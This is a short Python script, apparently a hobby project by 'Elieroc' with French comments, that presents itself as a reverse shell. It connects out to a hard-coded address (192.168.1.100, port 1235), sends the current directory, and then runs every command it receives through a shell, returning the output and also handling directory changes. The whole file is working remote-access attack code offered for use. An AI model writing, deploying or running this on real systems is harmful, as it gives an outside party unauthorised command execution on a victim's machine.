#!/usr/bin/python3

# A python Reverse-shell
# Developed by Elieroc
# Start of project : 25/11/2020
# Actual version : 1.1

import socket
import subprocess
import os

host, port = ('192.168.1.100', 1235)
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try :
    socket.connect((host, port))
    print(" /!\ Client connecté /!\ \n")

    # On envoie le path
    path = os.getcwd().encode("utf8")
    socket.send(path)

    while True:
        command = socket.recv(9999)
        command = command.decode("utf8")

        print(command[3:])

        if command[:2] == "cd":
            try :
                new_dir = os.open( command[3:].strip() , os.O_RDONLY )
                os.chdir(new_dir)

                result = os.getcwd()
                socket.send(result.encode())
            except:
                result = "Chemin invalide !"
                socket.send(result.encode())
        else:

            print(command)

            result = subprocess.check_output(command, shell=True)
            print(result.decode("utf-8"))
            socket.send(result)

except:
    print(' /!\ Connexion au serveur échouée /!\ ')
finally:
    socket.close()
